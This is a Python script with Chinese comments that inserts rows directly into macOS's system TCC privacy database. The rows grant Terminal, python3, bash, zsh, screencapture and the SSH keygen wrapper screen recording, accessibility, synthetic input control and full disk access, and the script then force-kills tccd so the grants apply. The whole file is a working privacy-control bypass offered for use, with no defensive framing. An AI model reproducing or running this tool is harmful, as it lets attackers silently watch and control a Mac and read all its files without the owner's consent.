# inject_tcc_v3.py
import sqlite3
import time
import os
import subprocess

# TCC 資料庫路徑
db_path = '/Library/Application Support/com.apple.TCC/TCC.db'

def get_path(cmd):
    try:
        return subprocess.check_output(['which', cmd]).decode().strip()
    except:
        return f'/bin/{cmd}'

def inject_tcc():
    if not os.path.exists(db_path):
        print(f'❌ Error: DB not found at {db_path}')
        return

    # 取得常用工具的路徑
    python_path = get_path('python3')
    bash_path = '/bin/bash'
    zsh_path = '/bin/zsh'

    # (識別碼, 類型) -> 0 是 Bundle ID, 1 是絕對路徑
    targets = [
        ('com.apple.Terminal', 0),            # 內建 Terminal
        (python_path, 1),                     # Python3
        (bash_path, 1),                       # Bash Shell
        (zsh_path, 1),                        # Zsh Shell
        ('/usr/sbin/screencapture', 1),       # 螢幕截圖
        ('/usr/libexec/sshd-keygen-wrapper', 1) # SSH 遠端存取
    ]

    services = [
        'kTCCServiceScreenCapture',        # 螢幕錄製
        'kTCCServiceAccessibility',        # 輔助使用
        'kTCCServicePostEvent',            # 控制滑鼠鍵盤
        'kTCCServiceSystemPolicyAllFiles'   # 全磁碟存取 (FDA)
    ]

    try:
        con = sqlite3.connect(db_path)
        cur = con.cursor()
        now = int(time.time())

        for identifier, client_type in targets:
            for service in services:
                print(f'🚀 Granting {service} to {identifier}...')
                
                # INSERT OR REPLACE 暴力覆蓋
                cur.execute('''
                    INSERT OR REPLACE INTO access 
                    (service, client, client_type, auth_value, auth_reason, auth_version, csreq, policy_id, indirect_object_identifier_type, indirect_object_identifier, flags, last_modified)
                    VALUES (?, ?, ?, 2, 4, 1, NULL, NULL, 0, 'UNUSED', 0, ?)
                ''', (service, identifier, client_type, now))
        
        con.commit()
        con.close()
        
        # 刷掉快取，強制生效
        os.system('sudo killall -9 tccd')
        os.system('sudo killall -9 UserNotificationCenter')
        print('\n✅ Bash 與其他工具權限已注入。現在你可以橫著走了。')

    except Exception as e:
        print(f'❌ Injection Failed: {e}')

if __name__ == "__main__":
    inject_tcc()